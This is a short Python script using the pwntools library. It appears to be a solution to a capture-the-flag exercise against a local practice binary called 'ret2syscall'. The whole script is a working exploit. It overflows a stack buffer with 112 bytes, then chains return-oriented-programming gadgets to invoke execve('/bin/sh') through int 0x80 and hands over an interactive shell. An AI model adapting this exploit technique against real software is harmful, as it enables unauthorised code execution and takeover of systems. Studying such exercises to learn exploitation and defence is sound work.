#!/usr/bin/env python
from pwn import *
 
sh = process('./ret2syscall')
 
pop_eax_ret = 0x080bb196
#pop_edx_ecx_ebx_ret = 0x0806eb90
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x080be408
payload = 'a'*112
payload += p32(pop_eax_ret) + p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0)+ p32(binsh)
payload += p32(int_0x80)
sh.sendline(payload)
sh.interactive()

